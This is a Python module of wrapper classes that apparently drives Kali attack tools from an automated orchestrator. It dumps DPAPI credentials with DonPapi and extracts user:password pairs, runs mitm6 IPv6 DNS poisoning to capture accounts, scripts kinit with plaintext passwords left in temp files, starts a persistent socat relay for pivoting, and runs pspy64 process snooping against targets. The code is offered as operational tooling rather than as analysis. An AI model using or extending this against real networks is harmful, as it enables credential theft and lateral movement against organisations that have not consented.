import re
import shlex

from orchestrator.kali_tools_client import kali


class DonPapiWrapper:
    async def dump(self, target: str, username: str = "", password: str = "",
                   domain: str = "", timeout: int = 120) -> dict:
        args = f"-d {target}"
        if username:
            args += f" -u {username}"
        if password:
            args += f" -p {shlex.quote(password)}"
        if domain:
            args += f" --domain {domain}"
        result = await kali.run("donpapi", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        creds = re.findall(r'(\S+:\S+)', stdout)
        return {"success": len(creds) > 0, "credentials": creds[:50], "count": len(creds), "raw": stdout[:3000]}


class Mitm6Wrapper:
    async def poison(self, domain: str, interface: str = "eth0",
                     timeout: int = 120) -> dict:
        result = await kali.run("mitm6", f"-d {domain} -i {interface}", timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        captured = re.findall(r'([\w-]+(?:\$)?@[\w.]+)', stdout)
        return {"success": len(captured) > 0, "captured": captured, "raw": stdout[:3000]}


class Krb5Wrapper:
    async def kinit(self, username: str, password: str, domain: str,
                    timeout: int = 60) -> dict:
        import tempfile
        with tempfile.NamedTemporaryFile(mode="w", suffix=".sh", delete=False) as f:
            f.write(f"echo {shlex.quote(password)} | kinit {shlex.quote(username)}@{shlex.quote(domain)}")
            script = f.name
        result = await kali.run("bash", script, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        return {"success": "kinit:" not in stdout.lower(), "raw": stdout[:2000]}

    async def klist(self, timeout: int = 30) -> dict:
        result = await kali.run("klist", "", timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        tickets = re.findall(r'(\S+@\S+)', stdout)
        return {"success": len(tickets) > 0, "tickets": tickets, "raw": stdout[:2000]}


class SocatWrapper:
    async def relay(self, listen_port: int, forward_host: str, forward_port: int,
                    protocol: str = "tcp", timeout: int = 300) -> dict:
        args = f"{protocol}-l:{listen_port},reuseaddr,fork {protocol}:{forward_host}:{forward_port}"
        loop = f"while true; do socat {args}; done &"
        result = await kali.run("bash", f"-c {shlex.quote(loop)}", timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        return {"success": True, "listener": f"{protocol}://0.0.0.0:{listen_port}", "forward": f"{forward_host}:{forward_port}"}


class PsySpyWrapper:
    async def monitor(self, target: str, username: str = "", password: str = "",
                      timeout: int = 120) -> dict:
        args = f"ssh {username}@{target}" if username else target
        result = await kali.run("pspy64", args, timeout=timeout)
        stdout = (result.get("stdout") or "") + (result.get("stderr") or "")
        events = [l.strip() for l in stdout.split("\n") if "cmd:" in l.lower() or "UID" in l]
        return {"success": len(events) > 0, "events": events[:50], "raw": stdout[:3000]}
